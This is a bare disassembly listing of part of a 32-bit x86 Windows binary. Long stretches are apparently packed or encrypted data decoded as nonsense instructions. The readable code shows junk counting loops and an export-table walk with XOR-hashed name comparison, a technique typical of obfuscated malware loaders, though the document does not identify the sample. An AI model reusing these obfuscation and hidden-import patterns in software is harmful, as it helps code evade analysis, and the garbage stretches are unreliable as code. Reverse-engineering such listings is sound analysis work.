  41a1a5:	lods   eax,DWORD PTR ds:[esi]
  41a1a6:	adc    al,0x1b
  41a1a8:	xor    BYTE PTR [edx],cl
  41a1aa:	inc    ecx
  41a1ab:	imul   esi,esi,0xffffffb0
  41a1ae:	loop   0x41a1bf
  41a1b0:	xchg   ecx,eax
  41a1b1:	leave  
  41a1b2:	or     DWORD PTR [ebx],esp
  41a1b4:	addr16 mov ds:0xd265,al
  41a1b8:	std    
  41a1b9:	mov    esp,0x34719f31
  41a1be:	mov    cl,0xd
  41a1c0:	out    0x8e,al
  41a1c2:	call   0x1267:0x491bce07
  41a1c9:	repnz mov dh,0x34
  41a1cc:	inc    ebx
  41a1cd:	cs ins BYTE PTR es:[edi],dx
  41a1cf:	mov    ah,0xd4
  41a1d1:	jp     0x41a1bd
  41a1d3:	push   0xb940552
  41a1d8:	jp     0x41a180
  41a1da:	mov    edx,0xef27258c
  41a1df:	dec    ecx
  41a1e0:	cmp    al,0xe8
  41a1e2:	fwait
  41a1e3:	je     0x41a20b
  41a1e5:	xor    eax,esi
  41a1e7:	ins    BYTE PTR es:[edi],dx
  41a1e8:	mov    ds:0x2e5d311b,eax
  41a1ed:	pop    ebp
  41a1ee:	or     ecx,ebx
  41a1f0:	xchg   BYTE PTR [esi-0x55],dh
  41a1f3:	aad    0x76
  41a1f5:	push   ebp
  41a1f6:	pop    esp
  41a1f7:	mov    DWORD PTR [ebx+0x31f28caf],esi
  41a1fd:	jbe    0x41a218
  41a1ff:	add    cl,BYTE PTR [ebx+0x4d8bfc45]
  41a205:	loopne 0x41a1ce
  41a207:	add    eax,0x42a7b1
  41a20c:	sbb    al,0x0
  41a20e:	add    BYTE PTR [eax],al
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a290
  41a293:	adc    al,0xe2
  41a295:	stos   BYTE PTR es:[edi],al
  41a296:	cwde   
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a31d
  41a29f:	push   edi
  41a2a0:	fcomp  DWORD PTR [esi]
  41a2a2:	inc    edx
  41a2a3:	enter  0xb30c,0x27
  41a2a7:	jne    0x41a294
  41a2a9:	xchg   esi,eax
  41a2aa:	cmc    
  41a2ab:	xchg   edx,eax
  41a2ac:	outs   dx,DWORD PTR ds:[esi]
  41a2ad:	fwait
  41a2ae:	cmp    dl,BYTE PTR [edi]
  41a2b0:	test   eax,0x46dc09fe
  41a2b5:	adc    BYTE PTR [edi-0x6],0x9a
  41a2b9:	test   DWORD PTR [eax+0x6a],ecx
  41a2bc:	add    eax,0x599ba7bc
  41a2c1:	jno    0x41a27a
  41a2c3:	mov    es,WORD PTR [edx+0x435b8128]
  41a2c9:	cmp    al,0xdb
  41a2cb:	xchg   ebx,eax
  41a2cc:	push   DWORD PTR [esi-0x63f88b27]
  41a2d2:	lods   eax,DWORD PTR ds:[esi]
  41a2d3:	pushf  
  41a2d4:	scas   al,BYTE PTR es:[edi]
  41a2d5:	add    eax,0xded0a3b0
  41a2da:	xlat   BYTE PTR ds:[ebx]
  41a2db:	sti    
  41a2dc:	cmp    BYTE PTR [edi+ebp*1+0x1d],dh
  41a2e0:	add    esi,esi
  41a2e2:	mov    cl,0xf6
  41a2e4:	out    0xb5,al
  41a2e6:	aas    
  41a2e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2e8:	cld    
  41a2e9:	pop    esp
  41a2ea:	and    edi,ebx
  41a2ec:	or     eax,0x119bcaae
  41a2f1:	jae    0x41a361
  41a2f3:	mov    dh,0xf1
  41a2f5:	cs jle 0x41a365
  41a2f8:	xchg   DWORD PTR [ebp-0x530b2790],esi
  41a2fe:	div    BYTE PTR [ecx+0x55]
  41a301:	icebp  
  41a302:	jle    0x41a284
  41a304:	xchg   ebp,eax
  41a305:	pop    ss
  41a306:	test   DWORD PTR [esi],edx
  41a308:	arpl   WORD PTR [eax-0x75],ax
  41a30b:	dec    esi
  41a30c:	cwde   
  41a30d:	sub    BYTE PTR [edi],ah
  41a30f:	push   cs
  41a310:	imul   edi,DWORD PTR [ecx],0x71d789a1
  41a316:	push   ebx
  41a317:	ffreep st(7)
  41a319:	js     0x41a2ba
  41a31b:	mov    BYTE PTR [esi],dh
  41a31d:	jbe    0x41a331
  41a31f:	add    DWORD PTR ds:0x284c2eed,ebp
  41a325:	xor    DWORD PTR [esi],eax
  41a327:	mov    WORD PTR [ebp-0x2],es
  41a32a:	jmp    0x6a82f902
  41a32f:	je     0x41a379
  41a331:	pop    eax
  41a332:	repnz inc DWORD PTR [edi-0x28]
  41a336:	je     0x41a37e
  41a338:	bound  esi,QWORD PTR [edi+0x5a]
  41a33b:	jmp    0x41a317
  41a33d:	push   ss
  41a33e:	inc    ebx
  41a33f:	jae    0x41a3b2
  41a341:	gs clc 
  41a343:	mov    dh,0x3a
  41a345:	mov    ds:0x5e4e3e33,al
  41a34a:	test   al,0xeb
  41a34c:	xchg   edi,eax
  41a34d:	pop    ebp
  41a34e:	jo     0x41a2d0
  41a350:	sub    eax,0x9dc5c3ac
  41a355:	(bad)  
  41a356:	ret    0x5958
  41a359:	rcr    BYTE PTR [eax+0x3318cea9],0xbb
  41a360:	mov    ds:0x10ad4b5,al
  41a365:	cs sahf 
  41a367:	sub    esi,edx
  41a369:	push   ebx
  41a36a:	cwde   
  41a36b:	hlt    
  41a36c:	ins    DWORD PTR es:[edi],dx
  41a36d:	into   
  41a36e:	call   0x9e1c:0x697fbaf3
  41a375:	dec    edi
  41a376:	rcl    DWORD PTR [edx+0x1c338d33],1
  41a37c:	jmp    DWORD PTR [ecx+0x5acf292d]
  41a382:	adc    ch,bh
  41a384:	dec    ecx
  41a385:	das    
  41a386:	mov    dh,0xa8
  41a388:	pushf  
  41a389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a38a:	retf   0xda34
  41a38d:	cmp    eax,ebp
  41a38f:	ror    BYTE PTR [esi+edx*8+0x300bccd6],1
  41a396:	xchg   edx,eax
  41a397:	jns    0x41a3c3
  41a399:	ficom  WORD PTR [edi+ecx*1+0x7fa14d2f]
  41a3a0:	mov    bl,0xcf
  41a3a2:	or     eax,0xf9cfcbed
  41a3a7:	aas    
  41a3a8:	mov    al,0x86
  41a3aa:	shl    DWORD PTR [ebx-0x64],0x12
  41a3ae:	aas    
  41a3af:	mov    esi,0x5010cb31
  41a3b4:	xor    eax,0xc51eb04e
  41a3b9:	test   al,0xaf
  41a3bb:	mov    ch,0x56
  41a3bd:	cmp    al,0x14
  41a3bf:	lock inc ecx
  41a3c1:	ror    DWORD PTR [ebp+0x696f4678],cl
  41a3c7:	data16 rcl dl,cl
  41a3ca:	inc    ebx
  41a3cb:	test   DWORD PTR [eax+0x4e],0x3534f9cf
  41a3d2:	add    edx,eax
  41a3d4:	gs mov edi,0x9e7cd417
  41a3da:	jp     0x41a454
  41a3dc:	inc    edi
  41a3dd:	enter  0xd141,0x3f
  41a3e1:	xor    ebx,DWORD PTR [eax+0x18cbb655]
  41a3e7:	popf   
  41a3e8:	sbb    BYTE PTR ds:[eax-0x51],dh
  41a3ec:	fucomip st,st(4)
  41a3ee:	imul   edi,esp,0x23d40b58
  41a3f4:	jecxz  0x41a44a
  41a3f6:	jge    0x41a409
  41a3f8:	loope  0x41a385
  41a3fa:	int    0x9d
  41a3fc:	pusha  
  41a3fd:	mov    ecx,0xbdbef4c2
  41a402:	bound  ebx,QWORD PTR [ecx]
  41a404:	mov    ds:0xc7e926f6,eax
  41a409:	int3   
  41a40a:	pop    eax
  41a40b:	or     BYTE PTR [esi-0x69],al
  41a40e:	or     BYTE PTR [esi],0x74
  41a411:	repnz leave 
  41a413:	jmp    0x6e30:0x89797b23
  41a41a:	out    dx,eax
  41a41b:	cli    
  41a41c:	(bad)  
  41a41e:	sub    DWORD PTR [edi+0xf42485c],esp
  41a424:	sbb    eax,0x500cee2f
  41a429:	repz xor BYTE PTR [ebx+ecx*8+0x3a],bl
  41a42e:	rcl    ah,cl
  41a430:	ins    DWORD PTR es:[edi],dx
  41a431:	popa   
  41a432:	adc    edx,DWORD PTR [edx-0x378cd92c]
  41a438:	lea    ebx,[ebp+0x1c]
  41a43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a43c:	jmp    0x41a44e
  41a43e:	jge    0x41a420
  41a440:	push   ss
  41a441:	icebp  
  41a442:	pushf  
  41a443:	rcr    BYTE PTR [ebp+0x5d],1
  41a446:	int    0x60
  41a448:	xlat   BYTE PTR ds:[ebx]
  41a449:	outs   dx,BYTE PTR ds:[esi]
  41a44a:	dec    edx
  41a44b:	pusha  
  41a44c:	xlat   BYTE PTR ds:[ebx]
  41a44d:	adc    eax,0xf4b42cbc
  41a452:	popf   
  41a453:	sub    eax,0xe5b1c261
  41a458:	push   esi
  41a459:	in     eax,0xb7
  41a45b:	push   0x4f
  41a45d:	sub    DWORD PTR ds:0x6a8c4dba,ebx
  41a463:	jg     0x41a47c
  41a465:	cdq    
  41a466:	retf   0x8308
  41a469:	sbb    eax,0x78101565
  41a46e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a46f:	outs   dx,BYTE PTR ds:[esi]
  41a470:	into   
  41a471:	push   ss
  41a472:	jecxz  0x41a46a
  41a474:	andnps xmm7,XMMWORD PTR [edi+0x6b46ae08]
  41a47b:	popa   
  41a47c:	je     0x41a476
  41a47e:	add    eax,0x3b3bd072
  41a483:	push   es
  41a484:	pop    edx
  41a485:	sti    
  41a486:	push   DWORD PTR [edx-0x72]
  41a489:	mov    edx,0xe5eed10e
  41a48e:	not    esi
  41a490:	repnz cs fcmovbe st,st(6)
  41a494:	pop    edi
  41a495:	inc    edx
  41a496:	mov    ebx,0x4793d8de
  41a49b:	and    DWORD PTR [ebx-0xb487723],0xf29a1132
  41a4a5:	mov    edi,0x1bd7b9ab
  41a4aa:	shl    ah,1
  41a4ac:	add    ecx,DWORD PTR [ebp-0x65]
  41a4af:	popf   
  41a4b0:	adc    eax,edi
  41a4b2:	dec    ebx
  41a4b3:	cdq    
  41a4b4:	or     al,0xd6
  41a4b6:	mov    DWORD PTR [ebp-0x14],eax
  41a4b9:	mov    DWORD PTR ds:0x42a75d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	cld    
  41a68f:	mov    ds:0xd7b08bc4,eax
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a62f
  41a69b:	cli    
  41a69c:	mov    ds:0xec5600f1,eax
  41a6a1:	int    0x90
  41a6a3:	(bad)  
  41a6a4:	fld    DWORD PTR [ebx+0x4cda0d11]
  41a6aa:	cld    
  41a6ab:	pop    edi
  41a6ac:	pop    eax
  41a6ad:	outs   dx,DWORD PTR ds:[esi]
  41a6ae:	jg     0x41a69f
  41a6b0:	jp     0x41a670
  41a6b2:	(bad)  
  41a6b3:	or     DWORD PTR [edi-0x4e9728d5],edx
  41a6b9:	jl     0x41a65a
  41a6bb:	sbb    ch,0xa4
  41a6be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6bf:	lods   eax,DWORD PTR ds:[esi]
  41a6c0:	dec    eax
  41a6c1:	xor    DWORD PTR [edi],eax
  41a6c3:	fcom   DWORD PTR [ebx]
  41a6c5:	jae    0x41a730
  41a6c7:	cs in  eax,dx
  41a6c9:	and    cl,ah
  41a6cb:	lods   eax,DWORD PTR ds:[esi]
  41a6cc:	in     al,0x9d
  41a6ce:	xor    esi,DWORD PTR [edi]
  41a6d0:	or     edx,DWORD PTR [edi+0x95076e9]
  41a6d6:	dec    ebx
  41a6d7:	add    al,0xb
  41a6d9:	and    ebx,edx
  41a6db:	jmp    0x41a752
  41a6dd:	sar    BYTE PTR [eax],cl
  41a6df:	hlt    
  41a6e0:	cwde   
  41a6e1:	inc    esp
  41a6e2:	or     eax,0x2906f10
  41a6e7:	sar    DWORD PTR [ebx+0x6f17b956],1
  41a6ed:	mov    BYTE PTR [eax*4+0x3828aa32],dl
  41a6f4:	mov    ebp,0x9c349ca8
  41a6f9:	cld    
  41a6fa:	and    DWORD PTR [esi+eax*8+0x377cfe],0x321aec28
  41a705:	add    BYTE PTR [ebx+0x40f760e3],ch
  41a70b:	xchg   DWORD PTR [ecx],edx
  41a70d:	and    eax,0x4e0efd64
  41a712:	cdq    
  41a713:	sar    BYTE PTR [edx+ebx*1-0x7d699674],0x2c
  41a71b:	mov    edx,0x78cfec36
  41a720:	jb     0x41a75b
  41a722:	(bad)  
  41a723:	hlt    
  41a724:	mov    ds:0x67dce52,eax
  41a729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a72a:	call   0x7459:0x58b85629
  41a731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a732:	sub    al,0x56
  41a734:	cs push ss
  41a736:	and    DWORD PTR [esi-0x4c],edx
  41a739:	sbb    DWORD PTR [eax+0x216ad99a],esi
  41a73f:	out    dx,al
  41a740:	dec    ebx
  41a741:	add    ah,cl
  41a743:	pop    edx
  41a744:	push   eax
  41a745:	out    dx,eax
  41a746:	retf   
  41a747:	or     al,0x5c
  41a749:	hlt    
  41a74a:	sub    cl,ah
  41a74c:	xor    eax,0x8cf27866
  41a751:	ins    DWORD PTR es:[edi],dx
  41a752:	(bad)  
  41a753:	(bad)  
  41a754:	xor    ebp,DWORD PTR [edi+0x1e]
  41a757:	push   ss
  41a758:	add    DWORD PTR [esi+0x46],esp
  41a75b:	inc    ecx
  41a75c:	inc    DWORD PTR [edi]
  41a75e:	jp     0x41a6e7
  41a760:	sbb    ah,BYTE PTR [edi+0x45]
  41a763:	or     al,0xf2
  41a765:	out    dx,al
  41a766:	aas    
  41a767:	cli    
  41a768:	shr    DWORD PTR [ebx],0xf9
  41a76b:	jae    0x41a76c
  41a76d:	fdiv   DWORD PTR fs:0xa75114f2
  41a774:	mov    DWORD PTR [esi],0x514da2bc
  41a77a:	(bad)  
  41a77b:	jne    0x41a7c0
  41a77d:	ss clc 
  41a77f:	int3   
  41a780:	pop    ebx
  41a781:	xchg   esp,eax
  41a783:	out    dx,eax
  41a784:	xchg   ebp,eax
  41a785:	jo     0x41a70e
  41a787:	mov    esi,0xd0d75611
  41a78c:	popf   
  41a78d:	inc    eax
  41a78e:	pushf  
  41a78f:	stos   BYTE PTR es:[edi],al
  41a790:	sub    BYTE PTR [eax+esi*8-0x60],ch
  41a794:	into   
  41a795:	loop   0x41a7a9
  41a797:	mov    ds:0x38e22a45,al
  41a79c:	or     ebx,DWORD PTR [eax+0x7ce2c911]
  41a7a2:	ror    DWORD PTR [eax],1
  41a7a4:	gs jle 0x41a76d
  41a7a7:	pusha  
  41a7a8:	jmp    0x41a7a9
  41a7aa:	sbb    eax,0xf984c660
  41a7af:	fmul   QWORD PTR [edx]
  41a7b1:	repnz xor DWORD PTR [edi+0x7f66b817],esp
  41a7b8:	fwait
  41a7b9:	dec    ebp
  41a7ba:	sub    edx,DWORD PTR [ebx]
  41a7bc:	(bad)  
  41a7bd:	std    
  41a7be:	call   0x6771fde6
  41a7c3:	xor    dl,BYTE PTR [edi-0x2d7358d0]
  41a7c9:	loop   0x41a7b1
  41a7cb:	or     dh,BYTE PTR [edx-0x368211c3]
  41a7d1:	arpl   bp,di
  41a7d3:	or     esp,DWORD PTR [edi+0x21]
  41a7d6:	cmp    ecx,DWORD PTR [esi+0xd51d811]
  41a7dc:	sti    
  41a7dd:	iret   
  41a7de:	shl    DWORD PTR [esi-0x77],0x46
  41a7e2:	ret    
  41a7e3:	jmp    0x41a7eb
  41a7e5:	jbe    0x41a773
  41a7e7:	(bad)  
  41a7e8:	sbb    eax,0x25e97abe
  41a7ed:	fild   WORD PTR [esi+ebp*8+0x50]
  41a7f1:	test   eax,0xf9fc0910
  41a7f6:	fbstp  TBYTE PTR [eax+0x36]
  41a7f9:	out    0xe,al
  41a7fb:	out    dx,eax
  41a7fc:	cli    
  41a7fd:	outs   dx,BYTE PTR ds:[esi]
  41a7fe:	ja     0x41a781
  41a800:	cld    
  41a801:	shl    BYTE PTR [eax*2-0x30575c75],1
  41a808:	adc    BYTE PTR [ecx-0xaf100f3],0x51
  41a80f:	pop    es
  41a810:	mov    edx,0x4d5358c4
  41a815:	dec    ecx
  41a816:	jnp    0x41a7e5
  41a818:	sbb    BYTE PTR [ebx+0x4261620d],al
  41a81e:	pop    esi
  41a81f:	outs   dx,BYTE PTR ds:[esi]
  41a820:	push   edx
  41a821:	xor    BYTE PTR [ebp+0x2e1a1bae],dl
  41a827:	or     al,0xdc
  41a829:	out    dx,eax
  41a82a:	mov    esp,0x86bd8faf
  41a82f:	out    dx,al
  41a830:	sub    DWORD PTR [eax+0x570a9722],esi
  41a836:	in     al,0xed
  41a838:	sahf   
  41a839:	adc    DWORD PTR [esi+0x6a2410cc],0xac0ddb55
  41a843:	pop    edi
  41a844:	pusha  
  41a845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a846:	lods   eax,DWORD PTR ds:[esi]
  41a847:	xchg   ebp,eax
  41a848:	sbb    ebp,DWORD PTR [ecx+0x45]
  41a84b:	mov    ebx,0x6ee94a79
  41a850:	jb     0x41a884
  41a852:	mov    edx,0x2c8408a6
  41a857:	xchg   ecx,eax
  41a858:	pop    eax
  41a859:	xor    bh,bl
  41a85b:	inc    esp
  41a85c:	(bad)
  41a860:	fistp  QWORD PTR [ecx]
  41a862:	sub    ecx,edx
  41a864:	sahf   
  41a865:	pop    ss
  41a866:	mov    ebp,DWORD PTR [ecx-0x31d904f1]
  41a86c:	gs or  al,0xd1
  41a86f:	or     BYTE PTR ds:0xb99e556e,0xb8
  41a876:	lds    esi,FWORD PTR [edx-0x1dcf9e8f]
  41a87c:	mov    esi,0x87d8cfa4
  41a881:	dec    ebx
  41a882:	jbe    0x41a866
  41a884:	push   ecx
  41a885:	mov    cl,0x5
  41a887:	sub    BYTE PTR [esi-0x7b],0xad
  41a88b:	cmp    DWORD PTR [edi+0x42385fd8],esp
  41a891:	xor    DWORD PTR [eax-0x1],0xffffff83
  41a895:	mov    ds:0xf9abdf3d,eax
  41a89a:	adc    bh,BYTE PTR [esi+0x7cc9ff2]
  41a8a0:	xor    edi,esp
  41a8a2:	mov    cr4,edx
  41a8a5:	pusha  
  41a8a6:	je     0x41a8bf
  41a8a8:	cwde   
  41a8a9:	jecxz  0x41a831
  41a8ab:	mul    DWORD PTR [edx]
  41a8ad:	js     0x41a8a3
  41a8af:	mov    bl,0x32
  41a8b2:	add    eax,ebx
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	add    DWORD PTR [esi],0x21
  41a917:	mov    WORD PTR [ebx+0x48],cs
  41a91a:	aad    0x7f
  41a91c:	js     0x41a92e
  41a91e:	jle    0x41a998
  41a920:	js     0x41a945
  41a922:	xor    al,bh
  41a924:	sub    DWORD PTR [edi+0x1d],0x7d
  41a928:	cmp    BYTE PTR [eax],0x99
  41a92b:	mov    dl,0x7
  41a92d:	(bad)  
  41a92e:	jmp    0xf5d0:0x5dafb2f9
  41a935:	and    BYTE PTR [edx-0x44c490d8],bl
  41a93b:	pop    es
  41a93c:	stos   DWORD PTR es:[edi],eax
  41a93d:	into   
  41a93e:	ins    BYTE PTR es:[edi],dx
  41a93f:	pop    ds
  41a940:	sub    dl,BYTE PTR [eax]
  41a942:	test   BYTE PTR [edx],bh
  41a944:	push   esi
  41a945:	mov    bh,0xc5
  41a947:	mov    bl,0xda
  41a949:	xchg   esi,eax
  41a94a:	call   0x6eb8:0xbf9f75c4
  41a951:	fdiv   QWORD PTR [ecx]
  41a953:	lea    eax,[edx+0x71cb41e9]
  41a959:	push   es
  41a95a:	jl     0x41a946
  41a95c:	aam    0x15
  41a95e:	cs cmp dh,al
  41a961:	test   al,0xad
  41a963:	or     al,0xec
  41a965:	ss pop ds
  41a967:	mov    eax,0x1b8fc64b
  41a96c:	mov    ds:0x34413d78,eax
  41a971:	cmp    eax,0x5d58dff5
  41a976:	fild   DWORD PTR [ebx+0x310eca5c]
  41a97c:	jge    0x41a9e2
  41a97e:	test   al,0xa9
  41a980:	mov    cl,0x68
  41a982:	and    DWORD PTR [esi],ecx
  41a984:	call   0x4d251c8a
  41a989:	xlat   BYTE PTR ds:[ebx]
  41a98a:	or     DWORD PTR [edx+0x35],ecx
  41a98d:	pusha  
  41a98e:	retf   0xd8f2
  41a991:	jp     0x41a9bd
  41a993:	push   ebp
  41a994:	fdivr  QWORD PTR [edx]
  41a996:	jns    0x41a9d8
  41a998:	add    al,0x4b
  41a99a:	(bad)  
  41a99b:	inc    ebp
  41a99c:	lods   eax,DWORD PTR ds:[esi]
  41a99d:	adc    eax,0x967cec13
  41a9a2:	test   al,0x75
  41a9a4:	cmp    eax,0x555b9313
  41a9a9:	lods   eax,DWORD PTR ds:[esi]
  41a9aa:	neg    BYTE PTR [ebx]
  41a9ac:	jns    0x41a93e
  41a9ae:	in     eax,dx
  41a9af:	inc    edx
  41a9b0:	and    esp,esi
  41a9b2:	dec    edi
  41a9b3:	imul   edx,ebp,0x8b28a12e
  41a9b9:	xchg   esp,eax
  41a9ba:	xor    eax,0x8aa6463c
  41a9bf:	call   DWORD PTR [esi-0x19a95705]
  41a9c5:	lea    eax,[edx]
  41a9c7:	out    0xf5,eax
  41a9c9:	xor    BYTE PTR [edx+0x77ac07b1],bh
  41a9cf:	test   al,0x72
  41a9d1:	mov    cs,WORD PTR [esp+ebx*4-0x3b9c7465]
  41a9d8:	jp     0x41aa1c
  41a9da:	icebp  
  41a9db:	adc    DWORD PTR [esi-0x52157a95],eax
  41a9e1:	(bad)  
  41a9e2:	mov    ch,0x6a
  41a9e4:	pop    edi
  41a9e5:	imul   ebp,DWORD PTR ds:0x108c992d,0x6f
  41a9ec:	(bad)  
  41a9ed:	sub    eax,0x9001a874
  41a9f2:	sub    esi,DWORD PTR [ecx+0x3ba6f34f]
  41a9f8:	adc    al,0x2f
  41a9fa:	inc    esi
  41a9fb:	cmp    al,0x31
  41a9fd:	cmp    eax,ecx
  41a9ff:	add    eax,0x13add920
  41aa04:	pop    esp
  41aa05:	cmp    eax,0x9210a762
  41aa0a:	sbb    al,0x19
  41aa0c:	jae    0x41a98e
  41aa0e:	add    al,0x4
